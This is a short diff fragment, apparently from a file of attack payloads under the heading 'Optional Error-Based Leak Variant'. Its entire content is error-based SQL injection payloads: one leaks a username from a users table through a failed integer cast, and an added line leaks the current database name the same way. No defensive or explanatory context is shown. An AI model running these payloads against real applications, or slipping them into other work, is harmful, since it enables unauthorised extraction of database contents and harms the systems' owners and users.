@@ -23,3 +23,6 @@ Optional Error-Based Leak Variant
 '; SELECT 1 / CAST((SELECT username FROM users LIMIT 1) AS INTEGER); --
 
 encoded
+
+
+'; SELECT 1 / CAST((SELECT current_database()) AS INTEGER); --
